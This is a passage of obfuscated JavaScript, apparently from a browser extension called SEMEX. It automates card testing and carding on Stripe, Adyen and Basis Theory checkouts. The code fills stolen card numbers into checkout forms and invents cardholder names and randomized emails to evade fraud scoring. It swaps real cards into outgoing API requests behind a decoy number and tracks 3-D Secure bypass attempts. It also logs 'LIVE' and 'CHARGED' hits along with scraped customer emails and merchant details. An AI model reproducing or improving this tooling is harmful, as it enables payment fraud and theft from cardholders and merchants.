          card: _0x3894dd.card
        };
        window.top.postMessage(_0x13532a, "*");
        window.postMessage(_0x13532a, "*");
        return;
      } catch (_0x449bda) {}
    }
    let _0x3189bb = _0x3894dd.url || "unknown";
    if (_0x3189bb.includes("payment_intents/")) {
      const _0x4bea5b = _0x3189bb.match(/payment_intents\/([^/?]+)/);
      if (_0x4bea5b) {
        _0x3189bb = "payment_intents/" + _0x4bea5b[1];
      }
    } else if (_0x3189bb.includes("/adyen")) {
      const _0x5945a7 = _0x3189bb.match(/\/adyen[^/]*\/([^/?]+)/);
      if (_0x5945a7) {
        _0x3189bb = "adyen/" + _0x5945a7[1];
      }
    }
    const _0x45b1a6 = document.getElementById("semex-overlay");
    // data-semex-live distinguishes a POPULATED overlay from the hidden empty
    // provenance root the document_start bootstrap pre-creates on every page.
    if (!_0x45b1a6 || !_0x45b1a6.hasAttribute("data-semex-live")) {
      const _0x245f41 = _0x3189bb + "::" + _0x45ee39;
      const _0x47c27d = Date.now();
      if (recentStatuses.has(_0x245f41)) {
        const _0x47828d = recentStatuses.get(_0x245f41);
        if (_0x47c27d - _0x47828d < DEDUP_WINDOW) {
          return;
        }
      }
      recentStatuses.set(_0x245f41, _0x47c27d);
    }
    try {
      let _0x1a5ef3 = function (_0x9b2f3b) {
        let _0x38e02f = _0x3189bb + "::" + _0x45ee39;
        const _0xa1b92 = Date.now();
        const _0x108b52 = !!_0x9b2f3b && !!_0x9b2f3b.number;
        const _0x1812af = document.getElementById("semex-overlay");
        if ((!_0x1812af || !_0x1812af.hasAttribute("data-semex-live")) && processedPayments.has(_0x38e02f)) {
          const _0x1b17cf = processedPayments.get(_0x38e02f);
          const _0x592cad = _0xa1b92 - _0x1b17cf.timestamp;
          if (_0x592cad < PAYMENT_DEDUP_WINDOW) {
            if (_0x1b17cf.hasCard) {
              return;
            } else if (!_0x108b52) {
              return;
            }
          }
        }
        processedPayments.set(_0x38e02f, {
          timestamp: _0xa1b92,
          hasCard: _0x108b52
        });
        for (const [_0x343ffb, _0x556ce2] of processedPayments) {
          if (_0xa1b92 - _0x556ce2.timestamp > 60000) {
            processedPayments.delete(_0x343ffb);
          }
        }
        const _0x2f5d61 = _0x3894dd.url && _0x3894dd.url.includes("/payment_pages/") && _0x3894dd.url.includes("/init");
        if (!_0x9b2f3b || !_0x9b2f3b.number) {
          if (!_0x2f5d61) {}
        }
        const _0x4d55b8 = _0x3894dd.response || _0x3894dd.body;
        const {
          declineCode: _0x53ff8e,
          errorCode: _0x99533b
        } = extractDeclineCodes(_0x4d55b8, _0x45ee39, _0x288964);
        if (window.top === window) {
          const _0x2813c8 = _0x52445f(_0x3894dd.url);
          let _0x37f459 = _0x2813c8;
          if (_0x2813c8 === "stripe_checkout") {
            _0x37f459 = "STRIPE";
          } else if (_0x2813c8 === "stripe_inbuilt") {
            _0x37f459 = "STRIPE";
          } else {
            _0x37f459 = _0x2813c8.toUpperCase();
          }
          const _0x12ee70 = _0x53ff8e || _0x99533b || _0x288964 || null;
          const _0xf8f314 = _0x3894dd.url || window.location.href || "N/A";
          if (typeof window.showToast === "function") {
            window.showToast(_0x45ee39, _0x37f459, _0x12ee70);
          }
          // v2.8.6 — play a sound for CHARGED *and* every LIVE-class status
          // (CCN_LIVE / LIVE / 3D_LIVE), each with its own sound file.
          if (_0x45ee39 === "CHARGED" || String(_0x45ee39 || "").toUpperCase().indexOf("LIVE") !== -1) {
            playSuccessSound(_0x45ee39);
          }
          window.postMessage({
            type: "PAYMENT_STATUS_DETECTED",
            status: _0x45ee39,
            gateway: _0x2813c8,
            declineCode: _0x53ff8e || null,
            errorCode: _0x99533b || null,
            declineReason: _0x288964 || null,
            url: _0x3894dd.url,
            _forOverlay: true
          }, "*");
        }
        const _0x46f679 = _0x3894dd.url && (_0x3894dd.url.includes("/payment_pages/") || _0x3894dd.url.includes("checkout.stripe.com") || _0x3894dd.url.includes("invoice.stripe.com") || _0x3894dd.url.includes("billing.stripe.com"));
        const _0x26f779 = window.location.hostname === "checkout.stripe.com" || window.location.hostname === "pay.openai.com" || window.location.hostname === "buy.stripe.com" || window.location.hostname === "donate.stripe.com" || window.location.hostname === "invoice.stripe.com" || window.location.hostname === "billing.stripe.com";
        const _0x3254c5 = _0x46f679 || _0x26f779;
        let _0x4637fa = null;
        let _0x450c63 = null;
        let _0xcc683c = null;
        let _0x25c2e0 = null;
        let _0x46f6b7 = null;
        if (_0x3254c5) {
          // Invalidate stale siteInfo when the top-level host has changed since it
          // was captured (prevents a prior checkout's amount/merchant from bleeding
          // into a follow-up hit on a different site).
          if (cachedSiteInfo && _semexLastSiteInfoHost && _semexLastSiteInfoHost !== window.location.hostname) {
            cachedSiteInfo = null;
          }
          if (cachedSiteInfo && Object.keys(cachedSiteInfo).length > 0) {
            _0x4637fa = cachedSiteInfo.amount || null;
            _0x450c63 = cachedSiteInfo.currency || null;
            _0xcc683c = cachedSiteInfo.customerEmail || extractCustomerEmail(_0x4d55b8);
            _0x25c2e0 = cachedSiteInfo.domain && cachedSiteInfo.domain !== "N/A" ? cachedSiteInfo.domain : extractSiteDomain();
            if (_0x25c2e0 && _0x25c2e0 !== "N/A") {
              try {
                const _0x5d3b67 = new URL(_0x25c2e0);
                _0x46f6b7 = _0x5d3b67.hostname;
              } catch (_0x4834c2) {
                _0x46f6b7 = extractHostname();
              }
            } else {
              _0x46f6b7 = extractHostname();
            }
          } else {
            const _0x16c2f4 = extractAmountCurrency(_0x4d55b8);
            _0x4637fa = _0x16c2f4.amount;
            _0x450c63 = _0x16c2f4.currency;
            _0xcc683c = extractCustomerEmail(_0x4d55b8);
            _0x25c2e0 = extractSiteDomain();
            _0x46f6b7 = extractHostname();
          }
        } else {
          const _0x26f44b = extractAmountCurrency(_0x4d55b8);
          _0x4637fa = _0x26f44b.amount;
          _0x450c63 = _0x26f44b.currency;
          _0xcc683c = extractCustomerEmail(_0x4d55b8);
          _0x25c2e0 = extractSiteDomain();
          _0x46f6b7 = extractHostname();
        }
        let _0x1f5eb2 = null;
        let _0x3566f2 = null;
        let _0x14e77a = null;
        let _semexInvoiceUrl = null;
        let _semexInvoiceNumber = null;
        if (cachedSiteInfo && Object.keys(cachedSiteInfo).length > 0) {
          _0x1f5eb2 = cachedSiteInfo.merchant || null;
          _0x3566f2 = cachedSiteInfo.productName || null;
          _0x14e77a = cachedSiteInfo.successUrl || null;
          _semexInvoiceUrl = cachedSiteInfo.invoiceUrl || null;
          _semexInvoiceNumber = cachedSiteInfo.invoiceNumber || null;
        }
        // SEMEX inbuilt gap-fill: stripe_inbuilt (Stripe Elements / SetupIntent)
        // never populates the hosted-checkout siteInfo, so customerEmail,
        // successUrl and productName arrive empty. Fill ONLY empty fields from
        // (a) billing harvested off the confirm request, (b) a visible email
        // input, and (c) a conservative product-summary DOM scrape. A value
        // already found via the gateway response or cached siteInfo is never
        // overwritten. Runs before the successUrl->siteUrl derivation below so a
        // recovered return_url can also repair a Stripe-host siteUrl.
        try {
          let _semexBill = null;
          try {
            const _semexRoot = window.top && window.top !== window ? window.top : window;
            _semexBill = _semexRoot.__SEMEX_LAST_BILLING || null;
          } catch (_semexBe) {
            try {
              _semexBill = window.__SEMEX_LAST_BILLING || null;
            } catch (_semexBe2) {}
          }
          if (_semexBill && _semexBill.ts && Date.now() - _semexBill.ts < 120000) {
            if (!_0xcc683c && _semexBill.email) {
              _0xcc683c = _semexBill.email;
            }
            if (!_0x14e77a && _semexBill.returnUrl) {
              // Guard against a stale return_url left by a prior site: only accept
              // it when its registrable domain matches this hit's hostname (or when
              // the hostname is unknown / a Stripe host, where we have nothing
              // better and the derivation below wants a merchant URL anyway).
              let _semexUseRet = true;
              try {
                const _semexRetHost = new URL(_semexBill.returnUrl).hostname.toLowerCase();
                const _semexCurHost = String(_0x46f6b7 || "").toLowerCase();
                if (_semexRetHost && _semexCurHost && !/(^|\.)stripe\.com$/.test(_semexCurHost)) {
                  const _semexReg = function (_h) {
                    return _h.split(".").slice(-2).join(".");
                  };
                  if (_semexReg(_semexRetHost) !== _semexReg(_semexCurHost)) {
                    _semexUseRet = false;
                  }
                }
              } catch (_semexRetErr) {}
              if (_semexUseRet) {
                _0x14e77a = _semexBill.returnUrl;
              }
            }
          }
          if (!_0xcc683c) {
            const _semexEmail = _semexScrapeEmail();
            if (_semexEmail) {
              _0xcc683c = _semexEmail;
            }
          }
          if (!_0x3566f2) {
            const _semexProd = _semexScrapeProduct();
            if (_semexProd) {
              _0x3566f2 = _semexProd;
            }
          }
        } catch (_semexGapErr) {}
        // Reliability: a hit should always carry a usable merchant site URL. When
        // the captured siteUrl is empty or just the Stripe host, derive the real
        // merchant origin from the success/return URL (which points at the merchant).
        try {
          const _isStripeHost = s => !s || s === "N/A" || /(^|\.)stripe\.com/i.test(String(s));
          if (_isStripeHost(_0x25c2e0) && _0x14e77a) {
            const _su = new URL(_0x14e77a);
            if (_su.hostname && !/(^|\.)stripe\.com/i.test(_su.hostname)) {
              _0x25c2e0 = _su.protocol + "//" + _su.hostname + "/";
              _0x46f6b7 = _su.hostname;
            }
          }
          // v2.9.10: still a Stripe host (success_url empty too — common on
          // invoice/billing pages)? Scrape the merchant's real site from the
          // checkout page's own links (business-name header link, Terms /
          // Privacy footer links point at the merchant domain).
          if (_isStripeHost(_0x25c2e0)) {
            const _semexSite = _semexScrapeMerchantSite(_0x1f5eb2);
            if (_semexSite) {
              try {
                _0x25c2e0 = _semexSite;
                _0x46f6b7 = new URL(_semexSite).hostname;
              } catch (_e2) {}
            }
          }
        } catch (_e) {}
        // Merchant fallback via DOM scrape (og:site_name / title / etc). Never
        // overrides a real value already found — only fills when null/empty.
        if (!_0x1f5eb2 || _0x1f5eb2 === "N/A") {
          try {
            const _semexMerchant = _semexScrapeMerchant();
            if (_semexMerchant) _0x1f5eb2 = _semexMerchant;
          } catch (_e) {}
        }
        const _0x4efec8 = _0x53ff8e || _0x99533b || _0x288964 || "N/A";
        const _0x1ca812 = _0x288964 || _0x53ff8e || _0x99533b || "N/A";
        saveTransaction(_0x9b2f3b, _0x45ee39, _0x46f6b7 || _0x25c2e0, _0x4efec8, _0x1ca812, { amount: _0x4637fa, currency: _0x450c63, threeDSBypassed: (Date.now() - (window.__semexLast3dsBypass || 0)) < 120000 });
        if (_0x53ff8e === "3ds_bypass_failed" && _0x9b2f3b && _0x9b2f3b.number && IS_MAIN_FRAME) {
          if (!window._semex3dsRequeueLastTime) {
            window._semex3dsRequeueLastTime = {};
          }
          const _0x297ee0 = Date.now();
          const _0x2470fd = window._semex3dsRequeueLastTime[_0x9b2f3b.number] || 0;
          if (_0x297ee0 - _0x2470fd > 500) {
            window._semex3dsRequeueLastTime[_0x9b2f3b.number] = _0x297ee0;
            window.postMessage({
              type: "SEMEX_REQUEUE_3DS_FAILED_CARD",
              card: _0x9b2f3b
            }, "*");
            // Re-enable payment form buttons so the page does not stay frozen after bypass failure
            try {
              document.querySelectorAll('button[type="submit"],button.submit,[data-testid*="submit"],button.SubmitButton,[class*="PayButton"],[class*="pay-button"]').forEach(function(_semexBtn) {
                _semexBtn.disabled = false;
                _semexBtn.removeAttribute("aria-disabled");
                _semexBtn.classList.remove("SubmitButton--incomplete", "SubmitButton--disabled");
                _semexBtn.style.removeProperty("pointer-events");
                _semexBtn.style.removeProperty("opacity");
              });
            } catch (_semexFreezeErr) {}
          }
        }
        if (typeof chrome === "undefined" || !chrome.runtime || !chrome.runtime.sendMessage) {
          return;
        }
        try {
          Promise.race([chrome.runtime.sendMessage({
            type: "PAYMENT_RESULT",
            status: _0x45ee39,
            card: _0x9b2f3b,
            details: {
              declineReason: _0x288964,
              gateway: _0x52445f(_0x3894dd.url),
              url: _0x3894dd.url,
              siteUrl: _0x25c2e0,
              hostname: _0x46f6b7,
              merchant: _0x1f5eb2,
              productName: _0x3566f2,
              successUrl: _0x14e77a,
              response: _0x4d55b8,
              declineCode: _0x53ff8e,
              errorCode: _0x99533b,
              amount: _0x4637fa,
              currency: _0x450c63,
              customerEmail: _0xcc683c,
              invoiceUrl: _semexInvoiceUrl,
              invoiceNumber: _semexInvoiceNumber,
              threeDSBypassed: (Date.now() - (window.__semexLast3dsBypass || 0)) < 120000 ? "true" : ""
            }
          }), new Promise((_0x2cbe76, _0x8ca460) => setTimeout(() => _0x8ca460(new Error("Background script timeout (5s)")), 5000))]).catch(_0x511747 => {
            const _0x492031 = _0x511747 && _0x511747.message ? String(_0x511747.message) : String(_0x511747 || "");
            if (_0x492031.includes("Extension context invalidated") || _0x492031.includes("message port closed") || _0x492031.includes("Could not establish connection")) {
              return;
            }
            if (_0x492031.includes("timeout")) {
              return;
            }
          });
        } catch (_0x31705b) {
          const _0x50a4ab = _0x31705b && _0x31705b.message ? String(_0x31705b.message) : String(_0x31705b || "");
          if (_0x50a4ab.includes("Extension context invalidated") || _0x50a4ab.includes("message port closed") || _0x50a4ab.includes("Could not establish connection")) {
            return;
          }
        }
      };
      var _0x5a6511 = _0x1a5ef3;
      __name(_0x1a5ef3, "processTransaction");
      let _0x4a49d8 = _0x3894dd.card || lastFilledCard || null;
      if (!_0x4a49d8 || !_0x4a49d8.number) {
        (async () => {
          var _0x165170;
          var _0x18ff8e;
          let _0x4becff = null;
          try {
            const _0x25ffb9 = await chrome.storage.local.get(["__xpcard", "__xpcts"]);
            if ((_0x165170 = _0x25ffb9 == null ? undefined : _0x25ffb9.semexPersistentCard) == null ? undefined : _0x165170.number) {
              const _0x4c034d = Date.now() - (_0x25ffb9.semexPersistentCardTs || 0);
              if (_0x4c034d < 120000) {
                _0x4becff = _0x25ffb9.semexPersistentCard;
              } else {}
            } else {}
          } catch (_0x3ee4bc) {}
          if (!_0x4becff) {
            try {
              const _0x2ac3ba = await chrome.storage.session.get("__xlcard");
              if ((_0x18ff8e = _0x2ac3ba == null ? undefined : _0x2ac3ba.lastCapturedCard) == null ? undefined : _0x18ff8e.number) {
                _0x4becff = _0x2ac3ba.lastCapturedCard;
              } else {}
            } catch (_0x5f4e76) {
              if (!_0x5f4e76.message.includes("not allowed from this context")) {}
            }
          }
          if (_0x4becff) {} else {}
          _0x1a5ef3(_0x4becff || _0x4a49d8);
        })();
        return;
      }
      _0x1a5ef3(_0x4a49d8);
      return;
    } catch (_0x369c60) {
      const _0x2c0bba = _0x369c60 && _0x369c60.message ? String(_0x369c60.message) : String(_0x369c60 || "");
      if (_0x2c0bba.includes("Extension context invalidated") || _0x2c0bba.includes("message port closed") || _0x2c0bba.includes("Could not establish connection")) {
        return;
      }
    }
  }
}
__name(handleNetworkResponse, "handleNetworkResponse");
async function fillForm(_0x252793) {
  if (!_0x252793 || !_0x252793.selectors || !_0x252793.values) {
    return;
  }
  const _0x4372d6 = _0x252793.values;
  let _0x3c1c37 = null;
  const _0x2968af = _0x4372d6.cardNumber || _0x4372d6.number || null;
  if (_0x2968af) {
    _0x3c1c37 = {
      number: String(_0x2968af).replace(/\s/g, ""),
      month: null,
      year: null,
      cvv: _0x4372d6.cvv || _0x4372d6.cvc || null
    };
    if (_0x4372d6.expiry) {
      const _0x23c291 = String(_0x4372d6.expiry).trim();
      const _0x2044aa = _0x23c291.split("/");
      if (_0x2044aa.length === 2) {
        _0x3c1c37.month = _0x2044aa[0].trim();
        const _0xf382de = _0x2044aa[1].trim();
        _0x3c1c37.year = _0xf382de.length === 2 ? "20" + _0xf382de : _0xf382de;
      }
    } else {
      _0x3c1c37.month = _0x4372d6.month || _0x4372d6.exp_month || null;
      _0x3c1c37.year = _0x4372d6.year || _0x4372d6.exp_year || null;
    }
    lastFilledCard = _0x3c1c37;
    try {
      chrome.runtime.sendMessage({
        type: "RELAY_CARD_DATA",
        card: _0x3c1c37
      }).catch(() => {});
    } catch (_0x55f4b9) {}
  } else {
    lastFilledCard = null;
  }
  const _0x11f44a = _0x252793.selectors;
  // Never invent card data: the old fallbacks silently filled Stripe's known
  // test card (4111…/12/26/123) whenever the payload lacked a card, producing
  // instant "live_mode_test_card" declines on live checkouts. No card → abort
  // loudly so the overlay shows the error instead of filling a test card.
  if (!(_0x4372d6.cardNumber || _0x4372d6.number)) {
    try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "no_card" }, "*"); } catch (_eNC) {}
    return;
  }
  const _0x14ac05 = {
    cardNumber: _0x4372d6.cardNumber || _0x4372d6.number,
    expiry: _0x4372d6.expiry || null,
    expMonth: _0x4372d6.expMonth || null,
    expYear: _0x4372d6.expYear || null,
    cvv: _0x4372d6.cvv || _0x4372d6.cvc || null,
    country: _0x4372d6.countryCode || "US",
    zip: _0x4372d6.zip,
    firstName: _0x4372d6.firstName,
    lastName: _0x4372d6.lastName,
    name: _0x4372d6.firstName && _0x4372d6.lastName ? _0x4372d6.firstName + " " + _0x4372d6.lastName : _0x4372d6.fullName || _0x4372d6.name || (function(){ var _fn=["James","Michael","Robert","William","David","Richard","Joseph","Thomas","Charles","Christopher","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kenneth","Kevin"]; var _ln=["Smith","Johnson","Williams","Brown","Jones","Miller","Davis","Garcia","Rodriguez","Wilson","Martinez","Anderson","Taylor","Thomas","Hernandez","Moore","Martin","Jackson","Thompson","White"]; return _fn[Math.floor(Math.random()*_fn.length)]+" "+_ln[Math.floor(Math.random()*_ln.length)]; })(),
    // Never fall back to a fixed @semex.pro mailbox — the same literal email on
    // every attempt is a trivial fraud-scoring tell. Derive a plausible mailbox
    // from the cardholder name (Jetix/Dot both generate per-identity emails).
    email: _0x4372d6.email || (function(){ var _n = (_0x4372d6.firstName && _0x4372d6.lastName ? _0x4372d6.firstName + " " + _0x4372d6.lastName : _0x4372d6.fullName || _0x4372d6.name || ""); var _b = String(_n).toLowerCase().replace(/[^a-z ]/g, "").trim().replace(/\s+/g, ".") || "user"; var _d = ["gmail.com","outlook.com","yahoo.com","icloud.com","hotmail.com","proton.me","aol.com"]; return _b + Math.floor(100 + Math.random() * 900) + "@" + _d[Math.floor(Math.random() * _d.length)]; })(),
    address: _0x4372d6.address || _0x4372d6.street,
    address2: _0x4372d6.address2 || _0x4372d6.line2 || "",
    city: _0x4372d6.city,
    state: _0x4372d6.state,
    phone: _0x4372d6.phone
  };
  // ── Card-replacement (placeholder) mode — Pixel Zero technique ───────────
  // When enabled, the VISIBLE form is filled with a harmless placeholder card
  // while the real BIN card is staged for the MAIN-world interceptor, which
  // swaps it into every outgoing Stripe API request body. The merchant page's
  // DOM never contains the real PAN (the MAIN-world bridge is postMessage —
  // the only channel across the ISOLATED/MAIN boundary). Hit reporting is
  // unaffected: lastFilledCard (set above) and the RELAY_CARD_DATA broadcast
  // already carry the REAL card.
  // STRIPE-ONLY: the network swap recognises Stripe-shaped request bodies
  // (card[number] keys) — on Adyen/Recurly/etc. forms the placeholder would
  // be submitted verbatim, so this mode must not touch non-Stripe contexts.
  try {
    const _semexIsStripeCtx = (function() {
      try {
        if (/^(?:[a-z0-9-]+\.)*stripe\.com$/i.test(location.hostname)) return true; // checkout/billing/invoice/js.stripe.com (elements iframe)
        // IS_STRIPE_CHECKOUT is sticky per-origin — only trust it when THIS
        // document actually hosts a Stripe frame, so a merchant page mixing
        // gateways can't route a non-Stripe fill through placeholder mode.
        if (sessionStorage.getItem("IS_STRIPE_CHECKOUT") === "true" &&
            document.querySelector('iframe[src*="js.stripe.com"], iframe[src*="checkout.stripe.com"]')) return true;
      } catch (_eCtx) {}
      return false;
    })();
    // TIMEOUT GUARD: chrome.storage can fail to call back in some iframe
    // contexts — without the race the whole fill hangs on "Filling form...".
    let _semexCrS = await Promise.race([
      new Promise(_r => { try { chrome.storage.local.get(["settings"], _x => _r((_x && _x.settings) || {})); } catch (_eS) { _r({}); } }),
      new Promise(_r => setTimeout(() => _r(null), 1500))
    ]);
    // Timeout → use the last-known-good cache rather than assuming mode off
    // (fail-safe for placeholder mode, not fail-open).
    if (_semexCrS === null) _semexCrS = _semexSettingsCache || {};
    const _semexCr = _semexCrS.cardReplacement;
    if (_semexCr && _semexCr.enabled === true && _semexIsStripeCtx && (!_semexCr.gateways || _semexCr.gateways.stripe !== false) && _0x3c1c37 && _0x3c1c37.number) {
      try {
        window.postMessage({
          type: "SEMEX_SET_PENDING_CARD",
          card: Object.assign({}, _0x3c1c37, { persistent: true, ts: Date.now() })
        }, "*");
      } catch (_ePC) {}
      _0x14ac05.cardNumber = "0000000000000000";
      _0x14ac05.expiry = "01/30";
      _0x14ac05.expMonth = "01";
      _0x14ac05.expYear = "2030";
      _0x14ac05.cvv = "000";
    }
  } catch (_eCR) {}
  const _0x1c8959 = __name(() => {
    // Guard against undefined/null selectors — canonical Stripe selectors only
    // have {cardNumber, expiry, cvv, name, email}, so calling
    // document.querySelector(undefined) for missing keys like "country" throws
    // a SyntaxError and causes fillForm to reject inside the Stripe iframe,
    // preventing the FILL_FORM handler from ever calling sendResponse.
    const _semexQS = function(_sel) { try { return _sel ? document.querySelector(_sel) : null; } catch(_e) { return null; } };
    return _semexQS(_0x11f44a.country) || _semexQS(_0x11f44a.name) || _semexQS(_0x11f44a.cardRadio) || _semexQS(_0x11f44a.city) || _semexQS(_0x11f44a.address) || _semexQS(".PaymentMethodFormAccordionItem") || _semexQS("#payment-method-label-card");
  }, "getMainFrameMatches");
  let _0x5aa32b = _0x1c8959();
  // New-UI checkout sessions live under /g/pay/ (old: /c/pay/), and the whole
  // payment form renders inside the js.stripe.com "elements-inner-*" iframe.
  // On the HOST frame (/g/pay/...) the card inputs are cross-origin — waiting
  // for them here will always time out. Only wait when we are actually inside
  // the elements-inner iframe or on an old /c/pay/ session.
  const _semexFillPath = window.location.pathname;
  // True only when we are the TOP frame of a new-UI /g/pay/ checkout.
  // In that case all form elements live in a cross-origin js.stripe.com iframe
  // and must be filled by forwarding the payload to that subframe via the
  // background's FILL_FORM_SUBFRAMES handler.
  // checkout.stripe.com/c/pay/ sessions use the same habanero elements-inner iframe as
  // /g/pay/. The country select in the top frame (`select[name="country"]`) was matching
  // the waitForElement poll, setting _0x5aa32b=true and running executeFillSequence in
  // the top frame — where the card inputs are cross-origin and unreachable. Treat /c/pay/
  // on checkout.stripe.com identically to /g/pay/: skip the top-frame wait entirely and
  // dispatch FILL_FORM_SUBFRAMES so the fill lands inside the elements-inner-habanero iframe.
  // Expand /c/pay/ iframe-routing to ALL Stripe merchant hosts, not just checkout.stripe.com.
  // pay.stripe.com, buy.stripe.com etc. can also serve /c/pay/ sessions with the habanero iframe.
  const _semexStripeHosts = ["checkout.stripe.com","pay.stripe.com","buy.stripe.com","donate.stripe.com","invoice.stripe.com","billing.stripe.com"];
  const _semexIsNewUIHost = IS_MAIN_FRAME && (
    _semexFillPath.startsWith("/g/pay/") ||
    (_semexFillPath.startsWith("/c/pay/") && _semexStripeHosts.includes((window.location.hostname||"").toLowerCase()))
  );
  if (!_0x5aa32b && !_semexIsNewUIHost && (_semexFillPath.startsWith("/c/pay/cs_live") || _semexFillPath.startsWith("/g/pay/cs_live") || _semexFillPath.includes("elements-inner-"))) {
    // Wait for late-rendering fields — only inside the iframe or for /c/pay/.
    const _0x4ec6c6 = (await waitForElement(_0x11f44a.country, 5000)) || (await waitForElement(_0x11f44a.name, 1000)) || (await waitForElement(".PaymentMethodFormAccordionItem", 1000)) || (await waitForElement(_0x11f44a.cardNumber, 3000));
    if (_0x4ec6c6) {
      _0x5aa32b = true;
    }
  }
  // Whop: card fields live in cross-origin Basis Theory hosted-element iframes
  // (js.basistheory.com) while email/name/country/address live in the top frame.
  // Top-frame matches would short-circuit into executeFillSequence below and
  // leave the card fields empty — dispatch the subframe fill FIRST, then fill
  // the top frame with the card keys stripped (its waitForElement would stall
  // ~3s waiting for a cardNumber that can never exist in this DOM).
  const _semexHasBtFrames = IS_MAIN_FRAME && Array.from(document.querySelectorAll("iframe")).some(function(_f){
    const _s = _f.src || "";
    return _s.includes("js.basistheory.com") && _s.includes("hosted-elements");
  });
  if (_semexHasBtFrames) {
    try {
      window.__SEMEX_SUBFRAMES_PAYLOAD = _0x252793;
      safeSendMessage({ type: "FILL_FORM_SUBFRAMES", payload: _0x252793 });
    } catch (_semexBtSubErr) {}
    // Card replacement (Basis Theory): stage the real card in the TOP window
    // too — some BT SDK builds originate the tokenize request from the parent
    // context, and this window's MAIN-world interceptor must hold the staged
    // card to perform the swap. Gated identically to the iframe branch.
    try {
      let _semexBtCrTop = await Promise.race([
        new Promise(_r => { try { chrome.storage.local.get(["settings"], _x => _r((_x && _x.settings) || {})); } catch (_eS2) { _r({}); } }),
        new Promise(_r => setTimeout(() => _r(null), 1500))
      ]);
      if (_semexBtCrTop === null) _semexBtCrTop = _semexSettingsCache || {};
      const _semexBtCrT = _semexBtCrTop.cardReplacement;
      if (_semexBtCrT && _semexBtCrT.enabled === true && (!_semexBtCrT.gateways || _semexBtCrT.gateways.basistheory !== false) && _0x3c1c37 && _0x3c1c37.number) {
        window.postMessage({
          type: "SEMEX_SET_PENDING_CARD",
          card: Object.assign({}, _0x3c1c37, { persistent: true, ts: Date.now() })
        }, "*");
      }
    } catch (_eBtTop) {}
    const _semexTopSel = Object.assign({}, _0x11f44a);
    delete _semexTopSel.cardNumber; delete _semexTopSel.expiry; delete _semexTopSel.cvv;
    delete _semexTopSel.expMonth; delete _semexTopSel.expYear;
    // skipCardValidation: card fields live in the Basis Theory subframes by
    // design — validating them here (absent selectors = "missing") falsely
    // posted empty_fields:cardNumber,expiry,cvv on every Whop fill.
    return await executeFillSequence(_semexTopSel, _0x14ac05, { skipCardValidation: true });
  }
  if (_0x5aa32b) {
    return await executeFillSequence(_0x11f44a, _0x14ac05);
  } else if (_semexIsNewUIHost) {
    // New-UI: forward the full payload to the elements-inner-habanero subframe.
    // The background enumerates all frames and sends FILL_FORM to any
    // js.stripe.com/elements-inner frame so the isolated-world content script
    // there can call executeFillSequence directly on the real DOM.
    // Result arrives asynchronously via relay — return null to signal that the
    // caller must NOT mark the fill done until the relay result is received.
    // Save payload for /g/→/c/ fallback: if no subframe is found, the
    // SEMEX_FILL_FORM_SUBFRAMES_FAILED handler uses this to try a direct DOM fill.
    try {
      window.__SEMEX_SUBFRAMES_PAYLOAD = _0x252793;
      safeSendMessage({ type: "FILL_FORM_SUBFRAMES", payload: _0x252793 });
    } catch (_semexSubErr) {}
    return null;
  } else if (IS_MAIN_FRAME && Array.from(document.querySelectorAll("iframe")).some(function(_semexFr){const _fs=_semexFr.src||"";return _fs.includes("js.stripe.com")&&(_fs.includes("elements-inner")||_fs.includes("embedded-checkout-inner"));})) {
    // Merchant-embedded Stripe Payment Element or Embedded Checkout: the card
    // form lives inside a cross-origin js.stripe.com elements-inner or
    // embedded-checkout-inner iframe on the merchant's own page. Require the
    // specific iframe URL markers to avoid forwarding fills to the always-present
    // Stripe.js controller frame (which holds no card fields and acks harmlessly,
    // masking the real elements-inner frame that loads later).
    // Result arrives asynchronously via relay — return null.
    try {
      safeSendMessage({ type: "FILL_FORM_SUBFRAMES", payload: _0x252793 });
    } catch (_semexSubErr) {}
    return null;
  } else if ((window.location.hostname || "").toLowerCase().includes("basistheory.com")) {
    // Basis Theory hosted-element field iframe (Whop): each iframe owns exactly
    // ONE card input (#cardNumber / #expirationDate / #cvc), so the full-card
    // validation in fillComponentFrame would falsely fail every frame here.
    // Fill whichever card field THIS frame owns and report per-field success.
    // Card values depend on card replacement: enabled → decoy here + real card
    // swapped into the api.basistheory.com tokenize request by this window's
    // MAIN-world interceptor; disabled → real values filled directly.
    // Card replacement (Basis Theory / Whop): when enabled, stage the REAL
    // card for this window's MAIN-world tokenize swap (interceptor hooks
    // api.basistheory.com) and write a luhn-valid decoy into the field —
    // never zeros: BT elements validate client-side and would block submit.
    // Gated at the point of substitution; when off, real values fill as before.
    try {
      let _semexBtCrS = await Promise.race([
        new Promise(_r => { try { chrome.storage.local.get(["settings"], _x => _r((_x && _x.settings) || {})); } catch (_eS) { _r({}); } }),
        new Promise(_r => setTimeout(() => _r(null), 1500))
      ]);
      if (_semexBtCrS === null) _semexBtCrS = _semexSettingsCache || {};
      const _semexBtCr = _semexBtCrS.cardReplacement;
      if (_semexBtCr && _semexBtCr.enabled === true && (!_semexBtCr.gateways || _semexBtCr.gateways.basistheory !== false) && _0x14ac05.cardNumber) {
        try {
          window.postMessage({
            type: "SEMEX_SET_PENDING_CARD",
            card: {
              number: String(_0x14ac05.cardNumber).replace(/\s+/g, ""),
              month: _0x14ac05.expMonth,
              year: _0x14ac05.expYear,
              cvv: _0x14ac05.cvv,
              persistent: true,
              ts: Date.now()
            }
          }, "*");
        } catch (_eBtPC) {}
        _0x14ac05.cardNumber = "4111111111111111";
        _0x14ac05.expiry = "12/30";
        _0x14ac05.expMonth = "12";
        _0x14ac05.expYear = "2030";
        _0x14ac05.cvv = "123";
      }
    } catch (_eBtCR) {}
    let _semexBtFilled = false;
    for (const _semexBtKey of ["cardNumber", "expiry", "expMonth", "expYear", "cvv"]) {
      const _semexBtSel = _0x11f44a[_semexBtKey];
      const _semexBtVal = _0x14ac05[_semexBtKey];
      if (_semexBtSel && _semexBtVal && document.querySelector(_semexBtSel)) {
        await fill(_semexBtSel, _semexBtVal);
        _semexBtFilled = true;
      }
    }
    return { success: _semexBtFilled, reason: _semexBtFilled ? null : "no_bt_field_matched" };
  } else {
    return await fillComponentFrame(_0x11f44a, _0x14ac05);
  }
}
__name(fillForm, "fillForm");
async function fillComponentFrame(_0xe0821a, _0x5c61c9) {
  // Fail-closed: start as failed so any exception before validation posts ok:false.
  let _semexCFFillOk = false, _semexCFFillError = "exception";
  try {
    const _0x47a3c8 = Object.keys(_0xe0821a);
    for (const _0x4a3c8b of _0x47a3c8) {
